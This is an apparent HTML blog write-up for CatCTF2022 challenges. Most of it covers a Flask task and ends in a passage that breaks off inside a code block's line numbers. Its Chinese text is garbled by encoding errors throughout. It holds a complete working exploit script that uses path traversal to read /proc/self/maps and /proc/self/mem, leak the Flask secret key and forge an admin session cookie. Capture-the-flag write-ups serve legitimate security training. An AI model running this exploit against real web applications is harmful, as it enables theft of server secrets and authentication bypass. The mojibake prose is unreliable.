class="line">    <span class="keyword">try</span>:</span><br><span class="line">        start = <span class="built_in">int</span>(start)</span><br><span class="line">        end = <span class="built_in">int</span>(end)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        start=<span class="number">0</span></span><br><span class="line">        end=<span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> filename != <span class="string">&quot;&quot;</span> <span class="keyword">and</span> os.access(filename, os.R_OK):</span><br><span class="line">        f = <span class="built_in">open</span>(filename, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> start &gt;= <span class="number">0</span>:</span><br><span class="line">            f.seek(start)</span><br><span class="line">            <span class="keyword">if</span> end &gt;= start <span class="keyword">and</span> end != <span class="number">0</span>:</span><br><span class="line">                data = f.read(end-start)</span><br><span class="line">                </span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                data = f.read()</span><br><span class="line">                </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            data = f.read()</span><br><span class="line">            </span><br><span class="line">        f.close()</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        data = (<span class="string">&quot;File `%s` not exist or can not be read&quot;</span> % filename).encode()</span><br><span class="line">            </span><br><span class="line">    <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure>

<h4 id="ä½¿ç”¨æ–¹æ³•"><a href="#ä½¿ç”¨æ–¹æ³•" class="headerlink" title="ä½¿ç”¨æ–¹æ³•"></a>ä½¿ç”¨æ–¹æ³•</h4><p>ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹</p>
<p>ä¾‹å¦‚æ–°å»ºä¸€ä¸ªa.txtï¼Œå†…å®¹å¦‚ä¸‹</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abcdefg</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨app.pyè¯»å–a.txtï¼Œä»ç¬¬1ä¸ªä½ç½®å¼€å§‹åˆ°ç¬¬3ä¸ªä½ç½®</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 cat.py -s 1 -e 3 -f a.txt</span><br></pre></td></tr></table></figure>

<img src="/2023/01/01/Nepnep-CatCTF2022/%E6%88%AA%E5%9B%BE8_iR0nB5T-O1.png" class="">

<h4 id="è§£é¢˜"><a href="#è§£é¢˜" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h4><p>è¿™é¢˜çš„å…³é”®ç‚¹å°±æ˜¯ä¼ªé€ sessionï¼Œä»è€Œè®¿é—®adminè·¯ç”±è·å–flag</p>
<p>ä½†ä¼ªé€ sessionéœ€è¦è·å–secret key</p>
<h4 id="è·å–secret-key"><a href="#è·å–secret-key" class="headerlink" title="è·å–secret key"></a>è·å–secret key</h4><p>è¿™é‡Œå¯ä»¥åˆ©ç”¨pythonå­˜å‚¨å¯¹è±¡çš„ä½ç½®åœ¨å †ä¸Šè¿™ä¸ªç‰¹æ€§ï¼Œ</p>
<p>appæ˜¯å®ä¾‹åŒ–çš„Flaskå¯¹è±¡ï¼Œè€Œsecret keyåœ¨<code>app.config[&#39;SECRET_KEY&#39;]</code>ï¼Œ</p>
<p>æ‰€ä»¥å¯ä»¥é€šè¿‡è¯»å–&#x2F;proc&#x2F;self&#x2F;memæ¥è¯»å–secret key</p>
<h4 id="è¯»å–å †æ ˆåˆ†å¸ƒ"><a href="#è¯»å–å †æ ˆåˆ†å¸ƒ" class="headerlink" title="è¯»å–å †æ ˆåˆ†å¸ƒ"></a>è¯»å–å †æ ˆåˆ†å¸ƒ</h4><p>ç”±äº&#x2F;proc&#x2F;self&#x2F;memå†…å®¹è¾ƒå¤šè€Œä¸”å­˜åœ¨ä¸å¯è¯»å†™éƒ¨åˆ†ï¼Œç›´æ¥è¯»å–ä¼šå¯¼è‡´ç¨‹åºå´©æºƒï¼Œ</p>
<p>æ‰€ä»¥å…ˆè¯»å–&#x2F;proc&#x2F;self&#x2F;mapsè·å–å †æ ˆåˆ†å¸ƒ</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">map_list = requests.get(url + <span class="string">f&quot;info?file=<span class="subst">&#123;bypass&#125;</span>/proc/self/maps&quot;</span>)</span><br><span class="line">map_list = map_list.text.split(<span class="string">&quot;\\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> map_list:</span><br><span class="line">    map_addr = re.<span class="keyword">match</span>(<span class="string">r&quot;([a-z0-9]+)-([a-z0-9]+) rw&quot;</span>, i)</span><br><span class="line">    <span class="keyword">if</span> map_addr:</span><br><span class="line">        start = <span class="built_in">int</span>(map_addr.group(<span class="number">1</span>), <span class="number">16</span>)</span><br><span class="line">        end = <span class="built_in">int</span>(map_addr.group(<span class="number">2</span>), <span class="number">16</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Found rw addr:&quot;</span>, start, <span class="string">&quot;-&quot;</span>, end)</span><br></pre></td></tr></table></figure>

<h4 id="è¯»å–å¯¹åº”ä½ç½®å†…å­˜æ•°æ®"><a href="#è¯»å–å¯¹åº”ä½ç½®å†…å­˜æ•°æ®" class="headerlink" title="è¯»å–å¯¹åº”ä½ç½®å†…å­˜æ•°æ®"></a>è¯»å–å¯¹åº”ä½ç½®å†…å­˜æ•°æ®</h4><p>ç„¶åè¯»å–&#x2F;proc&#x2F;self&#x2F;memï¼Œè¯»å–å¯¹åº”ä½ç½®çš„å†…å­˜æ•°æ®ï¼Œ</p>
<p>å†ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æŸ¥æ‰¾å†…å®¹</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">res = requests.get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/info?file=<span class="subst">&#123;bypass&#125;</span>/proc/self/mem&amp;start=<span class="subst">&#123;start&#125;</span>&amp;end=<span class="subst">&#123;end&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;*abcdefgh&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">   secret_key = re.findall(<span class="string">&quot;[a-z0-9]&#123;32&#125;\*abcdefgh&quot;</span>, res.text)</span><br><span class="line">      <span class="keyword">if</span> secret_key:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Secret Key:&quot;</span>, secret_key[<span class="number">0</span>])</span><br></pre></td></tr></table></figure>

<h4 id="ä¼ªé€ session"><a href="#ä¼ªé€ session" class="headerlink" title="ä¼ªé€ session"></a>ä¼ªé€ session</h4><p>sessionä¼ªé€ å¯ä»¥åˆ©ç”¨å¦‚ä¸‹<a target="_blank" rel="noopener" href="https://github.com/noraj/flask-session-cookie-manager" title="é¡¹ç›®">é¡¹ç›®</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/noraj/flask-session-cookie-manager</span><br></pre></td></tr></table></figure>

<h4 id="ä¸€é”®è·å–flag"><a href="#ä¸€é”®è·å–flag" class="headerlink" title="ä¸€é”®è·å–flag"></a>ä¸€é”®è·å–flag</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="comment">#----------------------------------</span></span><br><span class="line"><span class="comment">###################################</span></span><br><span class="line"><span class="comment">#Edited by lx56@blog.lxscloud.top</span></span><br><span class="line"><span class="comment">###################################</span></span><br><span class="line"><span class="comment">#----------------------------------</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> ast, sys</span><br><span class="line"><span class="keyword">from</span> abc <span class="keyword">import</span> ABC</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#æ­¤ç¨‹åºåªèƒ½è¿è¡ŒäºPython3ä»¥ä¸Š</span></span><br><span class="line"><span class="keyword">if</span> sys.version_info[<span class="number">0</span>] &lt; <span class="number">3</span>: <span class="comment"># &lt; 3.0</span></span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;Must be using at least Python 3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#----------------session ä¼ªé€ ----------------</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MockApp</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, secret_key</span>):</span><br><span class="line">        <span class="variable language_">self</span>.secret_key = secret_key</span><br><span class="line">        </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FSCM</span>(<span class="title class_ inherited__">ABC</span>):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">secret_key, session_cookie_structure</span>):</span><br><span class="line">            <span class="string">&quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                session_cookie_structure = <span class="built_in">dict</span>(ast.literal_eval(session_cookie_structure))</span><br><span class="line">                si = SecureCookieSessionInterface()</span><br><span class="line">                s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> s.dumps(session_cookie_structure)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;[Encoding error] &#123;&#125;&quot;</span>.<span class="built_in">format</span>(e)</span><br><span class="line">                <span class="keyword">raise</span> e</span><br><span class="line"><span class="comment">#-------------------------------------------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#ç”±/proc/self/mapsè·å–å¯è¯»å†™çš„å†…å­˜åœ°å€ï¼Œå†æ ¹æ®è¿™äº›åœ°å€è¯»å–/proc/self/memæ¥è·å–secret key</span></span><br><span class="line">s_key = <span class="string">&quot;&quot;</span></span><br><span class="line">bypass = <span class="string">&quot;../..&quot;</span></span><br><span class="line"><span class="comment">#è¯·æ±‚fileè·¯ç”±è¿›è¡Œè¯»å–</span></span><br><span class="line">map_list = requests.get(url + <span class="string">f&quot;info?file=<span class="subst">&#123;bypass&#125;</span>/proc/self/maps&quot;</span>)</span><br><span class="line">map_list = map_list.text.split(<span class="string">&quot;\\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> map_list:</span><br><span class="line">    <span class="comment">#åŒ¹é…æŒ‡å®šæ ¼å¼çš„åœ°å€</span></span><br><span class="line">    map_addr = re.<span class="keyword">match</span>(<span class="string">r&quot;([a-z0-9]+)-([a-z0-9]+) rw&quot;</span>, i)</span><br><span class="line">    <span class="keyword">if</span> map_addr:</span><br><span class="line">        start = <span class="built_in">int</span>(map_addr.group(<span class="number">1</span>), <span class="number">16</span>)</span><br><span class="line">        end = <span class="built_in">int</span>(map_addr.group(<span class="number">2</span>), <span class="number">16</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Found rw addr:&quot;</span>, start, <span class="string">&quot;-&quot;</span>, end)</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#è®¾ç½®èµ·å§‹å’Œç»“æŸä½ç½®å¹¶è¯»å–/proc/self/mem</span></span><br><span class="line">        res = requests.get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/info?file=<span class="subst">&#123;bypass&#125;</span>/proc/self/mem&amp;start=<span class="subst">&#123;start&#125;</span>&amp;end=<span class="subst">&#123;end&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="comment">#å¦‚æœå‘ç°*abcdefghå­˜åœ¨å…¶ä¸­ï¼Œè¯´æ˜æˆåŠŸæ³„éœ²secretkey</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;*abcdefgh&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="comment">#æ­£åˆ™åŒ¹é…ï¼Œæœ¬é¢˜secret keyæ ¼å¼ä¸º32ä¸ªå°å†™å­—æ¯æˆ–æ•°å­—ï¼Œå†åŠ ä¸Š*abcdefgh</span></span><br><span class="line">            secret_key = re.findall(<span class="string">&quot;[a-z0-9]&#123;32&#125;\*abcdefgh&quot;</span>, res.text)</span><br><span class="line">            <span class="keyword">if</span> secret_key:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Secret Key:&quot;</span>, secret_key[<span class="number">0</span>])</span><br><span class="line">                s_key = secret_key[<span class="number">0</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#è®¾ç½®sessionä¸­adminçš„å€¼ä¸º1</span></span><br><span class="line">data = <span class="string">&#x27;&#123;&quot;admin&quot;:1&#125;&#x27;</span></span><br><span class="line"><span class="comment">#ä¼ªé€ session</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span> : <span class="string">&quot;session=&quot;</span> + FSCM.encode(s_key, data)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#è¯·æ±‚adminè·¯ç”±</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    flag = requests.get(url + <span class="string">&quot;admin&quot;</span>, headers=headers)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Flag is&quot;</span>, flag.text)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Something error&quot;</span>)</span><br></pre></td></tr></table></figure>

<img src="/2023/01/01/Nepnep-CatCTF2022/getflag_njEw5pkT4W.png" class="">

<h4 id="å†™åœ¨æœ€å"><a href="#å†™åœ¨æœ€å" class="headerlink" title="å†™åœ¨æœ€å"></a>å†™åœ¨æœ€å</h4><p>æä¾›docker-composeç­‰æ–‡ä»¶ï¼š<a target="_blank" rel="noopener" href="https://blog.lxscloud.top/static/post/CTF_Python_Flask/catcat/cat_cat.zip" title="https://blog.lxscloud.top/static/post/CTF_Python_Flask/catcat/cat_cat.zip">https://blog.lxscloud.top/static/post/CTF_Python_Flask&#x2F;catcat&#x2F;cat_cat.zip</a></p>
<p>è‹¥å¸ˆå‚…æƒ³è¦ç›´æ¥å¤ç°å¯ä»¥åˆ°æˆ‘çš„CTFå¹³å°ï¼š<a target="_blank" rel="noopener" href="https://ctfm.lxscloud.top/category/test/challenge/13" title="https://ctfm.lxscloud.top/category/test/challenge/13">https://ctfm.lxscloud.top/category/test/challenge/13</a></p>
<p>åŒæ—¶æä¾›expæ–‡ä»¶ä¸‹è½½ï¼ˆPython3.6ä»¥ä¸Šï¼‰ï¼š<a target="_blank" rel="noopener" href="https://blog.lxscloud.top/static/post/CTF_Python_Flask/catcat/getFlag.py" title="https://blog.lxscloud.top/static/post/CTF_Python_Flask/catcat/getFlag.py">https://blog.lxscloud.top/static/post/CTF_Python_Flask&#x2F;catcat&#x2F;getFlag.py</a></p>
<h3 id="ez-bypassğŸ¥"><a href="#ez-bypassğŸ¥" class="headerlink" title="ez_bypassğŸ¥"></a>ez_bypassğŸ¥</h3><p>ç®€å•çš„ bypass filter</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/ezbypassFlag_m2yqdH2WPI.png" class="">

<h3 id="ez-curlğŸ”—"><a href="#ez-curlğŸ”—" class="headerlink" title="ez_curlğŸ”—"></a>ez_curlğŸ”—</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span 